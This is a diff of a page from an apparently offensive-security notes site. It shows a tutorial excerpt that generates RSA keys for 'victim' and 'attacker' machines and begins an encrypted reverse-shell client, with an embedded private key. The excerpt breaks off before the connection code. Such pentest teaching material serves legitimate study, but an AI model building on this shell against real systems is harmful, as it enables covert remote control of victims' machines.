@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17119,291 +17142,562 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </details>
 <p>First, we will generate a pair of keys (private and public) on client side (victim's machine) and on server side (attacker machine).</p>
 <h2 id="gen-keys">Gen keys</h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
-</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="n">new_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="c1"># generate  RSA key that 4096 bits long</span>
-</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
-</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="c1">#Export the Key in PEM format, the PEM extension contains ASCII encoding</span>
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="n">public_key</span> <span class="o">=</span> <span class="n">new_key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">exportKey</span><span class="p">(</span><span class="s2">&quot;PEM&quot;</span><span class="p">)</span>
-</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="n">private_key</span> <span class="o">=</span> <span class="n">new_key</span><span class="o">.</span><span class="n">export_key</span><span class="p">(</span><span class="s2">&quot;PEM&quot;</span><span class="p">)</span>
-</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
-</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="n">public_key_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="n">public_key_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="n">public_key_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
-</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="n">private_key_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
-</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="n">private_key_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="n">private_key_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
-</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="nb">print</span><span class="p">(</span><span class="n">public_key</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="nb">print</span><span class="p">(</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course - All rights reserved </span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4"></a>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">new_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span> <span class="c1"># generate  RSA key that 4096 bits long</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="c1">#Export the Key in PEM format, the PEM extension contains ASCII encoding</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="n">public_key</span> <span class="o">=</span> <span class="n">new_key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">exportKey</span><span class="p">(</span><span class="s2">&quot;PEM&quot;</span><span class="p">)</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="n">private_key</span> <span class="o">=</span> <span class="n">new_key</span><span class="o">.</span><span class="n">export_key</span><span class="p">(</span><span class="s2">&quot;PEM&quot;</span><span class="p">)</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="n">public_key_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;public.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a><span class="n">public_key_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="n">public_key_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16"></a>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17"></a><span class="n">private_key_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;private.pem&quot;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18"></a><span class="n">private_key_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19"></a><span class="n">private_key_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20"></a>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21"></a><span class="nb">print</span><span class="p">(</span><span class="n">public_key</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22"></a><span class="nb">print</span><span class="p">(</span><span class="n">private_key</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="rsa-client-side-shell">RSA client side shell</h2>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="kn">import</span> <span class="nn">subprocess</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="kn">import</span> <span class="nn">socket</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_OAEP</span>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="kn">from</span> <span class="nn">Cryptodome.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">):</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>    <span class="n">privatekey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----</span>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="s1">MIIJKQIBAAKCAgEAt9mjsBED9D/MYnU+W5+6aP9SS1vgL9X6bThNkGKsZ5ZVfnoK</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="s1">4BxMBHI5Gi/YtoCJjyAGsWMpxy1fQ+F+ZWVAkwZDoQMWTrfZASHmQgB944PfGA7q</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="s1">fn15kDXmCyvzbitRyWvTs1LDDNF7Q/54Qj82h/85ibOPzQrpwQTjEAs8CJ14YWXA</span>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="s1">JnqOC6devaDYKdB7SSlueVtoQ8BxWc3hOJHJpvgZQ/6NixnICLIrFN0YbKZo4A0D</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="s1">3yRJIdumZw8uqwEMeIt41ja6zOG3gKtsG8suBZ/MvqX0WgojWr6hNs1Q8h3LtiSs</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="s1">PiUP/bTWD9zos8Yr7RuEabesjHlY0qcNzZ/YgKXdgxUkCikTjRon6Mvh7iWKAtEi</span>
-</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a><span class="s1">lQlDeBYMGUvFUQ5FMF5LZJ5Q/7+JXulv8WhqKTp4dGpB3kUWuN+ltxBr+IYPhpBf</span>
-</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="s1">McR97W+NuXDReUiIGFJpVI1m4AeCzz1BdAM7U928DcglK6IowMmN4McyKuv49YYP</span>
-</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="s1">d7TNFjJWc7P6e19V3BsxA5jpCc6Dxp5AM6WC0FqgSSOGVCIkcHT5wLcALyaXOaO0</span>
-</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a><span class="s1">vhMgWWO233Of33wh/7oHclsc5r44MHlZrNSeX2QIHCFU4Mwp1hutIuIKkn5dLt1q</span>
-</span><span id="__span-1-17"><a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a><span class="s1">mt2CDUO/uxGbdTf667c9TLYcYWoi/eDBdrVx7CkYI7g81RdcB6jGgbr9W4kCAwEA</span>
-</span><span id="__span-1-18"><a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="s1">AQKCAgAIZt7PJgfrOpspiLgf0c3gDIMDRKCbLwkxwpfw2EGOvlUL4aHrmf9zWJD5</span>
-</span><span id="__span-1-19"><a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="s1">fGRH+tnOe6UyqBh5rL4kyQJQue7YiTm/+vcjA83b+mOeco1OP3GLlOrseul6SKxJ</span>
-</span><span id="__span-1-20"><a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="s1">qGmIiFxFezMCh+64AD7E3bU7Oc5RKr3DaDxTH4ONOZ7y1cCZmDCvKso8N++T4sM2</span>
-</span><span id="__span-1-21"><a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="s1">oUofpxJrRoRw8VdzeTD07K61OhxgEAh/jfuD9tqoYxQK8Quzs2spig66PNtGu9X/</span>
-</span><span id="__span-1-22"><a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="s1">8batQ/AA9kbAa2HgCRSswajAIGnrAeGGeOkQ0FPLStjtOzbOycPMgCKK+IChlIkP</span>
-</span><span id="__span-1-23"><a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="s1">0oWj6ZOKU26asjUlekov3kiINBzduF+bGOKGnoxeguSiQE1DtsfXisvADMp53rLN</span>
-</span><span id="__span-1-24"><a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="s1">RjkzWDTN7l8zqgAd2hPB25Fhy5kKHA1MNqRPeUUIUp++FuYVJ1xNoMR61N6JvLzC</span>
-</span><span id="__span-1-25"><a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="s1">UTrUZW7mMxqXisccsuU8OdGB2DECP+sS82dWZqoKFZKjza1N5XBSm1f7nCTQqtJq</span>
-</span><span id="__span-1-26"><a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="s1">kYYA5d4FPJ1wxRKufRTklC6QSHoGm54z0ay4Mh0n08wIiYBRxsgtGk6crhpRfy12</span>
-</span><span id="__span-1-27"><a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="s1">e6lRU3htQnzc+JDrdZIjoL5lqDfi0wSxdVXAAQXRptsvSXwwt+h/zg9ZmqlsVoE1</span>
-</span><span id="__span-1-28"><a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="s1">hH7LeVyL31FRF1b2BiX7jyOeeoqZ1gkkNvwyvqnaOos+wGd2/QKCAQEA0aeVV0HM</span>
-</span><span id="__span-1-29"><a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a><span class="s1">HpJ7hUib/btWbX/zYQEwQRRCbHWGsxROumkJPgfRzPhDohDgv4ncrX0w7+4PESGp</span>
-</span><span id="__span-1-30"><a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="s1">9MNZBa9kPuwDNFsVxIdpWZgmJdALqLwpWPnGswwVp6Lk1jMHD2GxLkknHLvfmND3</span>
-</span><span id="__span-1-31"><a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="s1">fuqVj7k/bKFayqejlY2SyNUv/h+DsQQL2esM8A4TLGlFOgfaoz0wPii2HmANQPSa</span>
-</span><span id="__span-1-32"><a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="s1">16xjV/0uQGHW260d1norNVZCmRDC3Gqz8/rcTGYwEkeCCQ3ctlUJyAFVu+ILyIga</span>
-</span><span id="__span-1-33"><a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="s1">/kadDqiUkItIKl+fQI3stPyrHjh5cMUk+kPMjO36/yQ0f3Ox8cUkR5x3eW4RoFZQ</span>
-</span><span id="__span-1-34"><a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="s1">/khhdDqVmieQ/wKCAQEA4H3GCf1LijS7069AEyvOKcKTL+nDGdqz+xMc+sbtha37</span>
-</span><span id="__span-1-35"><a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="s1">8hh9mjvFaljJcKb4AxTTnT8RrCnabdtmuAXRsfHOu1BZdJAaW+hgWgY+PJL+XpBQ</span>
-</span><span id="__span-1-36"><a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="s1">8D3954EvE2aX910DDMYz2slm0IL5we8KLg76ZHi+zO8woeedSD7yHbox6ybHZr0H</span>
-</span><span id="__span-1-37"><a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="s1">L7G8fwI9zg/oz7+0P+vU3AV5hgnUDx5kY1hYNWmrBkgObRfJQNsiCDHkw6wRZPU+</span>
-</span><span id="__span-1-38"><a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="s1">XESQX2iUnh8HA7idWvLELFXjueHxEw15yKaw9toiO0T1MhbrBBsjElXDk6WuKmVj</span>
-</span><span id="__span-1-39"><a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="s1">C2/ZvG939IOO2cW8UeBdTABhO630QQdDtAk0YqILdwKCAQEAjm1UrSSL8LD+rPs4</span>
-</span><span id="__span-1-40"><a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="s1">zdS40Ea+JkZSa8PBpEDrMzk2irjUiIlzY9W8zJq+tCCKBGoqFrUZE0BVX2xeS9ht</span>
-</span><span id="__span-1-41"><a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="s1">N7nKK4U9cnezgCQ2tjVx1j2NsV5uODCbfXjSERo1T6PEZHdZ1NFlA0HjARuIY00r</span>
-</span><span id="__span-1-42"><a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a><span class="s1">4zZyoX3lSbIV5828ft0V7+mZy389GM/XArK5TsULKR5mabPqlRQXrOr/TklUa/AZ</span>
-</span><span id="__span-1-43"><a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="s1">va858Z7XyF7Sf7eMIsQaPPdYLQVdJ6G8Qo7FrjT2nf+DV5ZgkfTsoFymSdva0px/</span>
-</span><span id="__span-1-44"><a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="s1">4PpeGjs/yvEfv4xvC2a+SXgEuOfaTFtXyoDkETmdx2twTB3lpF68Jrq85yJw4i7y</span>
-</span><span id="__span-1-45"><a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="s1">dvkuLQKCAQBefJGeIr5orUlhD6Iob4eWjA7nW7yCZUrbom/QHWpbmZ8xhp1XDVFK</span>
-</span><span id="__span-1-46"><a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="s1">MZSXla9NnLZ0uNb3X6ZQFshlLA3Wl7ArpuX/6acuh+AGBBqt5DCsHJH0jCMSDY2C</span>
-</span><span id="__span-1-47"><a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a><span class="s1">3OuZccyW09V/gMWFfZshxTrDqAo7v5aPKx2NB69reRLu8C+Sif/jfixIJsbvrkHV</span>
-</span><span id="__span-1-48"><a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="s1">OV0EE+wJ+3jcInHDuN9IfcJDDiwSTydsvWdVA23xnkn0qQtgUEwB8jcNHs6lWZ8z</span>
-</span><span id="__span-1-49"><a id="__codelineno-1-49" name="__codelineno-1-49" href="#__codelineno-1-49"></a><span class="s1">7ltFda7FWOi4wG3ZDwAoxMM9cOuK+sTtrViGfJ7uW32nefGXc2Sa85F8ftdmOISE</span>
-</span><span id="__span-1-50"><a id="__codelineno-1-50" name="__codelineno-1-50" href="#__codelineno-1-50"></a><span class="s1">pdq6Tj+1NnoOQxqpw83KkQQuArHJ0eqBAoIBAQDPchq4XMwlEfjVjZCJEX++UyEA</span>
-</span><span id="__span-1-51"><a id="__codelineno-1-51" name="__codelineno-1-51" href="#__codelineno-1-51"></a><span class="s1">5H2hKbWOXU9WNhZCKmScrAlkW/6L0lHs1mngfxxavKOy2jIoUhb2/zeA/MKx6Jxa</span>
-</span><span id="__span-1-52"><a id="__codelineno-1-52" name="__codelineno-1-52" href="#__codelineno-1-52"></a><span class="s1">PqiKaOdqTYn6yaLkRS+7jUndDeFqDVCLqt3NprltVzLphjOB0I8PsUnIj5lKcE5K</span>
-</span><span id="__span-1-53"><a id="__codelineno-1-53" name="__codelineno-1-53" href="#__codelineno-1-53"></a><span class="s1">DjtbjnJYCjj0o346t3abOOoqxqYJmXgieRWkjjidkBOvL/Td7OZXM6jPVj744+ZE</span>
-</span><span id="__span-1-54"><a id="__codelineno-1-54" name="__codelineno-1-54" href="#__codelineno-1-54"></a><span class="s1">K2D/g7XtAIOACmSpYTtHRl7bxcoKP7QiPksNG17w+LWUqF2TwBexyCDKCV5XSIB9</span>
-</span><span id="__span-1-55"><a id="__codelineno-1-55" name="__codelineno-1-55" href="#__codelineno-1-55"></a><span class="s1">YVPwkPTGTNbOtTuTJk5hO+W4Nij4ERDdQlxd961YgRHORov+2sFREdhbrV0s</span>
-</span><span id="__span-1-56"><a id="__codelineno-1-56" name="__codelineno-1-56" href="#__codelineno-1-56"></a><span class="s1">-----END RSA PRIVATE KEY-----&#39;&#39;&#39;</span>
-</span><span id="__span-1-57"><a id="__codelineno-1-57" name="__codelineno-1-57" href="#__codelineno-1-57"></a>    <span class="n">private_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">privatekey</span><span class="p">)</span>
-</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a>    <span class="n">decryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">private_key</span><span class="p">)</span>
-</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>    <span class="k">return</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">cipher</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>
-</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
-</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a>    <span class="n">publickey</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;-----BEGIN PUBLIC KEY-----</span>
-</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="s1">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEApceMHQ9c5Cdf+qgd4ASP</span>
-</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="s1">M7WNbKavEwat78bMHQVK6cRNm2XSWCLpTsYN2eUALV++dYi2Im0T92bqYojRm+p4</span>
-</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a><span class="s1">vVKOvrdmcmfnITEw/++pbvGZYRf2y0zsSJi1Mi+lfgQs56QXBMIU6IdeCL2C7cex</span>
-</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a><span class="s1">9LNJ98ipGeN6nBiaExI9he3PcivztD5vHowCwkbzAnpZgPamrN10/KukWKvJ3t05</span>
-</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a><span class="s1">bc0MskjkhVaaN55eidzAXUmYmxyoLeke1GssiU+TInZQXbSiUeeFsZpkMjYX4nCS</span>
-</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a><span class="s1">xT/TuuFaDy6tfpfM+ePNEgeLjn7WAJh2ApxaYhmqwbDTsXd0ldHc4iNeGmlaEGE9</span>
-</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a><span class="s1">DgXPSp7ljV9SZ7eO9LZuiERz003NrUqSKSHdYgEIH8wZrCiKSP471oNYn0ye+KdV</span>
-</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a><span class="s1">/v25dqTXApO3QO/LZrJQ8twQyASR1LB3tTVYGuNpRVLlNC4j4ivL22uDCbGOIBOa</span>
-</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a><span class="s1">KDmu/QR5imLdjj3alVg69Ci3It3jTlubtHDaXTVs+i1133fOKMnRPLmCHE1/6MMS</span>
-</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a><span class="s1">i1BzDF46Q2XJwjgDnH5rk70n7sVquQtpHZkpQsuSSrjiL9Bi3jYghReVfFHC7aNF</span>
-</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a><span class="s1">p42v7EMaLohpnFm6yKiEm5UacMs7rLdnUQtAKo3r5UiNAegY6h/ZDncGhah1e5wF</span>
-</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a><span class="s1">dBPIb9wJyTjPYTiTJ3rDQGECAwEAAQ==</span>
-</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a><span class="s1">-----END PUBLIC KEY-----&#39;&#39;&#39;</span>
-</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a>    <span class="n">public_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">publickey</span><span class="p">)</span>
-</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>    <span class="n">encryptor</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
